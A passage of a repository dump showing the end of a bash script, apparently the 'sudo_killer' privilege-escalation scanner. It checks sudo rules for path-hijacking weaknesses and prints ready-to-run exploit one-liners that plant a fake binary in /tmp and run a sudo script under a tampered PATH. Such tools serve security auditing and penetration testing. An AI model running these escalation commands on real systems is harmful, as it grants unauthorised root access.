binaries_to_check=\"bash\\|cat\\|chmod\\|cp\\|ls\\|mkdir\\|mv\\|rm\\|echo\\|grep\\|ping\\|ps\\|su\\|fdisk\\|ifconfig\\|iptables\\|mount\\|umount\\|reboot\\|shutdown\\|curl\\|tar\\|unzip\\|wget\\|nano\\|git\\|gcc\\|crond\\|sshd\\|ntpd\\|sysctl\\|node\\|docker\\|nginx\\|ruby\\|python\\|python2\\|python3\\|find\"\n\n  while read -r sline; do\n    echo -e \"[-] Script Path: $sline\"\n\n    count=0\n    cat \"$sline\" | while read line; \n    do\n      #echo \"$line\"\n      ((count++))   \n      #chkbins=$(echo \"$line\" | grep -v \"print\" | grep -v \"\\#\" | grep -w \"$binaries_to_check\" | cut -d \" \" -f 1 | grep -v \"/\" 2>/dev/null)\n      chkbins=$(echo \"$line\" | grep -v \"print\" | grep -v \"\\#\" | grep -v \"/*bin/\" | grep -wo \"$binaries_to_check\" 2>/dev/null)\n      #echo \"$chkbins\"\n      if [ \"$chkbins\" ]; then\n        echo -e \" [+] Found non-full path binary: ${YELLOW}\"$chkbins\"${RESET} at line ${YELLOW}$count${RESET} which can be abused!\"\n        echo -e \" [*] Code: ${GREEN}$line${RESET}\"\n        echo -e \" [*] Exploit: echo '#!/bin/bash' > /tmp/$chkbins;echo 'id' >> /tmp/$chkbins; chmod +x /tmp/$chkbins; sudo PATH=/tmp:\\$PATH $sline; rm /tmp/$chkbins \\n\"\n        #echo -e \" [*] Exploit: echo '#!/bin/bash' > /tmp/[;echo 'id' >> /tmp/[; chmod +x /tmp/[; sudo PATH=/tmp:\\$PATH \\n\"\n      fi\n    done\n\n  done <<<\"$sort_line_script\"\n\n}\n\nfind_shell_builtin()\n{\n local line_script=\"$1\"\n\n  sort_line_script=$(echo \"$line_script\" | sort -u)\n  while read -r sline; do\n     #echo -e \"[-] Script Path: $sline\"\n       lfile=`echo $sline | sed 's/ //g'`\n       chkshlbi=$(cat \"$lfile\" | grep \"enable -n \" )\n         #echo $lfile\"\n       if [ -n \"$chkshlbi\" ]; then\n       echo -e \"[+] SHELL Built-ins disabling command found! ${YELLOW}$chkshlbi${RESET} in ${GREEN}$lfile${RESET}\"\n       echo -e \"[*] Note: notes/SHELL_BUILTIN.txt \"\n       echo -e \"[*] Exploit: echo '#!/bin/bash' > /tmp/${BLUE}<shell_bin>${RESET};echo 'id' >> /tmp/${BLUE}<shell_bin>${RESET}; chmod +x /tmp/${BLUE}<shell_bin>${RESET}; sudo PATH=/tmp:\\$PATH $sline\"\n       echo -e \"[*] Example: echo '#!/bin/bash' > /tmp/[;echo 'id' >> /tmp/[; chmod +x /tmp/[; sudo PATH=/tmp:\\$PATH $sline\\n\"\n       fi\n\n      chkshlbi1=$(cat \"$lfile\" | grep \".bashrc\\|\\.sh\" )\n      #echo \"++ $chkshlbi1\"\n       if [ -n \"$chkshlbi1\" ]; then\n       #echo \"$chkshlbi1\"\n          \n          ########### ISSUE HERE\n           for sline2 in $chkshlbi1; do\n          #while read -r sline2; do\n               #echo \"$sline2\"\n              chkshlbi2=$(cat \"$sline2\" | grep \"enable -n \" )\n              if [ -n \"$chkshlbi2\" ]; then\n                echo -e \"[+] SHELL Built-ins disabling command found! ${YELLOW}$chkshlbi2${RESET} in ${GREEN}$sline2${RESET}\"\n                echo -e \"[*] Note: notes/SHELL_BUILTIN.txt\"\n                echo -e \"[*] Exploit: echo '#!/bin/bash' > /tmp/${BLUE}<shell_bin>${RESET};echo 'id' >> /tmp/${BLUE}<shell_bin>${RESET}; chmod +x /tmp/${BLUE}<shell_bin>${RESET}; sudo PATH=/tmp:\\$PATH $sline\"\n                echo -e \"[*] Example: echo '#!/bin/bash' > /tmp/[;echo 'id' >> /tmp/[; chmod +x /tmp/[; sudo PATH=/tmp:\\$PATH $sline\\n\"\n              fi\n          #done <<< \"$chkshlbi1\"\n          done\n             \n       fi\n\n  done <<< \"$sort_line_script\"\n\n}\n\n\n\nfn_env_path_hijack() {\n\n  sudoenvpath_hijack=$(echo \"$cmd\" 2>/dev/null | grep -w \"\\!env_reset\")\n  if [ \"$sudoenvpath_hijack\" ]; then\n    echo -e \"${BOLD}${YELLOW}[+] Environment Variable is not reset when sudo is used (!env_reset): ${RESET}${BOLD}${RED}Vulnerable to Path Hijacking!${RESET} \\n\"\n  else\n    seten=$(echo \"$cmd\" 2>/dev/null | grep -w \"SETENV:\" | grep \".sh\\|.py\\|.rb\")\n    #echo \"$seten\"\n    if [ -n \"$seten\" ]; then\n      echo -e \"${BOLD}${YELLOW}[+] Tag SETENV is used along with script: ${RESET}${BOLD}${RED}Potentially vulnerable to Path Hijacking!${RESET} \\n\"\n      echo \"$seten\"\n      lseten=$(echo \"$seten\" | awk '{print $NF}')\n\n      echo -e \"\\n\"\n\n      #for \"$lscrp\" in \"$lseten\"; do\n      #echo \"$lscrp\"\n      #find_non_full_path_binaries \"$lseten\"\n      find_non_full_path_binaries2 \"$lseten\"\n\n      echo -e \"${BOLD}${YELLOW}[+] Checking for shell built-in disable command${RESET}\\n\"\n      find_shell_builtin \"$lseten\"\n      #done\n\n    fi\n\n  fi\n\n}\n\nfn_suid_with_sudo()\n{\n\ncsuidbin=$(find / -user root -perm -4000 -print 2>/dev/null | grep -v \"/usr/*\\|/bin/*\")\nif [ -n \"$csuidbin\" ]; then\n\n    for value in $csuidbin; do\n        srelpath=$(strings \"$value\" | grep -i sudo | grep -v \"bin/sudo\")\n        if [ -n \"$srelpath\" ]; then\n            echo -e \"[+] ${RED}Custom SUID binary found with sudo command (no full path)${RESET}\"\n            echo -e \"[+] ${YELLOW}It is possible to abuse environment path hijacking for the SUID binary:${RESET} $value\"\n            echo -e \"[*] Exploit: export PATH=/tmp:\\$PATH;echo '#!/bin/bash' > /tmp/sudo;echo 'id' >> /tmp/sudo; chmod +x /tmp/sudo; $value; rm /tmp/sudo\"\n            echo -e \"[*] Don't forget to remove /tmp from PATH!\\n\"\n        fi\n    done\n\nfi\n}\n\n\ncheckenvpathhijack() {\n  echo -e \"${BOLD}${YELLOW}[20/21] ====== Environment Path Hijacking ====== ${RESET} \\n\"\n  checkcustomsecurepath\n  fn_env_path_hijack\n  fn_suid_with_sudo\n  echo -e \"${BOLD}${BLUE}\\n[@] Check [20/21] Completed!${RESET} \\n\"\n\n}\n\nchecksudoappvuln()\n{\necho -e \"${BOLD}${YELLOW}[21/21] ====== App/Device Related Sudo vuln/misconfig ====== ${RESET} \\n\"\n   if [ \"$appsudocve\" ]; then\n    #./res/SK-app-check.sih\n    ./SK-Tools/SK-app-check.sh\n   else\n    echo -e \"${BOLD}${RED}Checks related to App/Device were skipped. To include them use the flag -a ${RESET} \\n\"\n   fi\n}\n\n#------------------------------------------------------\n\nfooter() {\n  echo -e \"\\n${GREEN}[*##################### SCAN_COMPLETED ##########################*] ${RESET} \"\n}\n\n####################################################################################\n\n# trap ctrl-c and call ctrl_c()\ntrap ctrl_c INT\n\nfunction ctrl_c() {\n  echo \"--------\"\n}\n\nwhile getopts \"hcaesi:r:p:\" opt; do\n  case $opt in\n  h)\n    header\n    usage\n    exit\n    ;;\n  c)\n    sudocve=\"1\"\n    ;;\n  a)\n    appsudocve=\"1\"\n    ;;\n  e)\n    exports=\"1\"\n    ;;\n  s)\n    sudopass=\"1\"\n    ;;\n  i)\n    import=\"$OPTARG\"\n    ;;\n  r)\n    report=\"$OPTARG\"\n    ;;\n  p)\n    path=\"$OPTARG\"\n    ;;\n  \\?)\n    echo \"Invalid option -$OPTARG\" >&2\n    ;;\n  esac\ndone\n\ncall_each() {\n  header\n  init\n  intro\n  checkinitial\n  checkcve\n  checkmisconfig\n  checkmissing\n  checkcredharvest\n  checkdangenvar\n  checkdangbin\n  checkrecurimper\n  checkenvpathhijack\n  checksudoappvuln\n  footer\n}\n\n# if [ -n \"$path\" ]; then\n#   vpath=\"/$path/sudo_killer-export-$(date +'%d-%m-%y')\"\n# else\n#   vpath=\"/tmp/sudo_killer-export-$(date +'%d-%m-%y')\"\n# fi\n\n# # Create the directory\n# mkdir -p \"$vpath\"\n\n# # Redirect the output to the report file if provided, otherwise to /dev/null\n# if [ -n \"$report\" ] || [ -n \"$export\" ]; then\n#   call_each | tee -a \"$vpath/$report\" 2> /dev/null\n# else\n#   call_each 2> /dev/null\n# fi\n\nif [ \"$path\" ]; then\n  mkdir -p /$path/sudo_killer-export-$(date +\"%d-%m-%y\") 2>/dev/null\n  call_each | tee -a /$path/sudo_killer-export-$(date +\"%d-%m-%y\")/$report 2>/dev/null\nelse\n  :\n  if [ \"$report\" ] || [ \"$export\" ]; then\n    mkdir -p /tmp/sudo_killer-export-$(date +\"%d-%m-%y\") 2>/dev/null\n    call_each | tee -a /tmp/sudo_killer-export-$(date +\"%d-%m-%y\")/$report 2>/dev/null\n  else\n    :\n    call_each 2>/dev/null\n  fi\n\nfi\n\n\n"
        },
        {
          "name": "dbins",
          "type": "tree",
          "content": null
        },
        {
          "name": "notes",
          "type": "tree",
          "content": null
        },
        {
          "name": "res",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}